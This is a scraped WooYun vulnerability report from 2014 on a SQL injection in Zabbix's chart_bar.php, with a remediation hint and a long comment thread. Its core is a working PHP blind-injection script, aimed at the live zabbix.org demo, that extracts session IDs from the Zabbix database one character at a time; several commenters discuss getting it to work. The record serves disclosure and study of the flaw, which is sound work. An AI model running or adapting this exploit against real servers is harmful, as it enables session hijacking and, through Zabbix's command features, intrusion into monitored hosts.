{"id": 117, "wybug_id": "wooyun-2014-072075", "wybug_title": "Zabbix的前台SQL注射漏洞0day一枚（官方测试受到影响）", "wybug_corp": "zabbix", "wybug_author": "Map", "wybug_date": "2014-08-12 15:33", "wybug_open_date": "2014-11-10 15:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 在zabbix前端存在一个SQL注射漏洞，由于zabbix前台可以在zabbix的server和client进行命令执行，所以这会导致很严重的后果。 详细说明：  在 /chart_bar.php 的163行代码 获取了一个来自GET,POST,COOKIE的值itemid。$itemid = $item['itemid']; 最后这个参数进到了SQL查询的过程\n\n在同一个文件内的$periods参数也存在一样的问题，导致了一样的SQL注射漏洞。   漏洞证明：  针对这个问题，我写了一个poc，在http://www.zabbix.org/zabbix/上测试通过。\n\n\n<?phprun_sql(\"SELECT sessionid from zabbix.sessions where userid in (select userid from zabbix.users) limit 1\");function run_sql($sql) {\t$url  = 'http://www.zabbix.org/zabbix/chart_bar.php';\t$data = 'config=1&items[][itemid]='.rawurlencode('6 and 1=2#');\t$true = strlen(post($url,$data));\t//’“≥§∂»\tfor($i=0;$i<=32;$i++) {\t\t//echo $i.\"\\r\\n\";\t\t$data = 'config=1&items[][itemid]='.rawurlencode('6 and length(('.$sql.')) = '.$i.'#');\t\t\t\t$test = strlen(post($url,$data));\t\t\t\tif($test < ($true - 200)) {\t\t\t$length = $i;\t\t\tbreak;\t\t}\t}\techo 'Length:'.$length.\"\\r\\n\";\techo 'Result:';\t\t$chars = array();\tif($length) {\t\tfor($l=0;$l<$length;$l++) {\t\t\t$char_list = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@.?-_\\/!$%^&*()~';\t\t\tfor($c=0;$c<strlen($char_list);$c++) {\t\t\t\t$data = 'config=1&items[][itemid]='.rawurlencode('6 and ord(substring(('.$sql.'),'.($l+1).',1)) = '.ord($char_list{$c}).'#');\t\t\t\t$test = strlen(post($url,$data));\t\t\t\tif($test < ($true - 200)) {\t\t\t\t\techo $char_list{$c};\t\t\t\t\t$chars[$l] = $char_list{$c};\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t}\t}}echo \"\\n\";function post($uri,$data) {\t$ch = curl_init ();\tcurl_setopt ( $ch, CURLOPT_URL, $uri );\tcurl_setopt ( $ch, CURLOPT_POST, 1 );\tcurl_setopt ( $ch, CURLOPT_HEADER, 0 );\tcurl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );\tcurl_setopt ( $ch, CURLOPT_POSTFIELDS, $data );\t$return = curl_exec ( $ch );\tcurl_close ( $ch );\treturn $return;}?>\n   修复方案：  使用 zbx_dbstr 函数处理变量。或者使用svn://svn.zabbix.com/branches/dev/ZBX-8582分支上的chart_bar.php进行修复。   版权声明：转载请注明来源 Map@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-08-12 15:34 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  sofa    \n     2014-08-12 15:36 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  屌。    \n     2014-08-12 15:37 |    \t\tJiuShao \t\t\t( 普通白帽子  |\t\t\t        Rank:405 漏洞数:94        | ╮(╯▽╰)╭锄禾日当午)\t\t \n  屌。    \n     2014-08-12 15:41 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  屌。    \n     2014-08-12 15:46 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  屌。    \n     2014-08-12 15:54 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  屌。    \n     2014-08-12 15:54 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:59        | http://www.tomatoyu.com/)\t\t \n  屌    \n     2014-08-12 15:55 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  屌    \n     2014-08-12 15:56 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  屌。     \n     2014-08-12 15:56 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  屌!    \n     2014-08-12 16:00 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  屌！    \n     2014-08-12 16:20 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  屌。    \n     2014-08-12 16:29 |    \t\tFireweed \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:14        | Show me the #)\t\t \n  mark    \n     2014-08-12 16:42 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  屌，爆了。    \n     2014-08-12 16:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  屌    \n     2014-08-12 17:09 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  屌    \n     2014-08-12 17:12 |    \t\tagnes \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 啊，啊)\t\t \n  屌    \n     2014-08-12 19:26 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  专业破队形    \n     2014-08-12 19:34 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  屌    \n     2014-08-12 21:59 |    \t\tDeep \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 一个小白.想要变小黑.)\t\t \n  屌。     \n     2014-08-13 11:25 |    \t\tX,D \t\t\t( 普通白帽子  |\t\t\t        Rank:143 漏洞数:8        | X,D)\t\t \n  为什么这么屌    \n     2014-08-13 11:29 |    \t\t数据流 \t\t\t( 普通白帽子  |\t\t\t        Rank:716 漏洞数:88        | all or nothing,now or never)\t\t \n  屌    \n     2014-08-13 13:33 |    \t\t墙角的小猫 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 神奇的路人甲~)\t\t \n  屌    \n     2014-08-13 21:31 |    \t\tsolihat \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | white hat,webapp security)\t\t \n  屌     \n     2014-08-14 09:30 |    \t\tAerfa21 \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:44        )\t\t \n  屌    \n     2014-08-14 13:39 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  屌    \n     2014-09-26 19:45 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  屌    \n     2014-09-26 19:56 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  屌    \n     2014-09-28 22:05 |    \t\t狗狗侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:497 漏洞数:55        | 我是狗狗侠)\t\t \n  一个半月过去了。。。看来咱们都得去看看zabbix了，哈哈    \n     2014-09-29 23:20 |    \t\tMartes \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:3        | 人若无名，便可专心练剑)\t\t \n  一个半月过去了。。。看来咱们都得去看看zabbix了，咋还没公开。。。    \n     2014-10-03 21:19 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  屌    \n     2014-10-07 22:04 |    \t\tLinE \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | Just For Like Hack)\t\t \n  屌屌屌    \n     2014-10-13 13:01 |    \t\tyeweit6 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 豫章故郡，洪都新府。星分翼轸，地接衡庐。...)\t\t \n  看来是不会公开了    \n     2014-10-24 17:00 |    \t\tClouds \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:12        | test)\t\t \n  为何还不公开!    \n     2014-11-09 21:24 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  这漏洞是不公开了吗    \n     2014-11-09 22:45 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @zcy @Clouds @yeweit6 11月10日公开的    \n     2014-11-10 10:06 |    \t\tyeweit6 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 豫章故郡，洪都新府。星分翼轸，地接衡庐。...)\t\t \n  @U神 没看到    \n     2014-11-10 10:08 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @yeweit6 准时公开    \n     2014-11-10 11:35 |    \t\tClouds \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:12        | test)\t\t \n  @U神 今天不是10日了怎么还没公开 - -     \n     2014-11-10 11:38 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @Clouds 2014-08-10 15:33    \n     2014-11-10 11:42 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  几个月了，还没公开！    \n     2014-11-10 13:05 |    \t\tClouds \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:12        | test)\t\t \n  @U神 真的假的 - -    \n     2014-11-10 15:35 |    \t\tyeweit6 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 豫章故郡，洪都新府。星分翼轸，地接衡庐。...)\t\t \n  @U神 吊    \n     2014-11-10 15:35 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  洞主太厉害了    \n     2014-11-10 15:38 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  我草!~~~公开了!~    \n     2014-11-10 15:53 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  $$$    \n     2014-11-10 16:03 |    \t\t小包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:19        | 关注技术与网络安全)\t\t \n  如此简单。。。    \n     2014-11-10 16:28 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  屌    \n     2014-11-10 16:41 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  屌屌屌屌屌屌屌屌sSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS    \n     2014-11-10 17:17 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  PHP Notice:  Undefined variable: length in /tmp/zabbix.php on line 42Length:Result:PHP Notice:  Undefined variable: length in /tmp/zabbix.php on line 46加了$length=32之后程序跑不出密码。这个漏洞有针对版本吗？    \n     2014-11-10 17:27 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  亮瞎，    \n     2014-11-10 17:38 |    \t\tzcy \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  楼上是妹子    \n     2014-11-10 19:30 |    \t\t0c0c0f \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | My H34rt c4n 3xploit 4ny h0les!)\t\t \n  楼上是妹子     \n     2014-11-10 19:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  洞主不知道通用漏洞新增加了个poc的模块    \n     2014-11-10 23:20 |    \t\t我是壮丁  \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专业打酱油)\t\t \n  有人利用成功了吗？    \n     2014-11-11 10:43 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  很多人关心这个漏洞的利用，我很想加大家的QQ，但是我是一个可爱的马甲，这个漏洞是可以利用的是没有问题的，版本的话，就是这个漏洞发布时间的那个版本和之前的版本，而如果你无法按照我的poc利用成功，原因是因为itemid不对，POC就是POC，它不是exp    \n     2014-11-11 10:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Map 你这个发早了 应该是有个poc模块得 需要付wb才能看到 多好啊    \n     2014-11-11 13:49 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  新版本竟然修复了。。 zabbix 怎么知道的。    \n     2014-11-11 14:00 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @′雨。 你成功了?    \n     2014-11-11 14:35 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @子非海绵宝宝 没测试啊， 就下了个最新版本的看了下代码 看到都被过滤了    \n     2014-11-11 14:44 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @′雨。 用2.0.13测试不成功啊....写了个工具跑itemid 也没成功 好奇怪    \n     2014-11-11 15:34 |    \t\tMap \t\t\t( 普通白帽子  |\t\t\t        Rank:154 漏洞数:10        | 闭关几个星期，学点东西。)\t\t \n  @′雨。 我在那边也报告了一下，是@xsser 让我在这里也报告一次的。    \n     2014-11-11 15:53 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  未能联系到厂商或者厂商积极拒绝    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}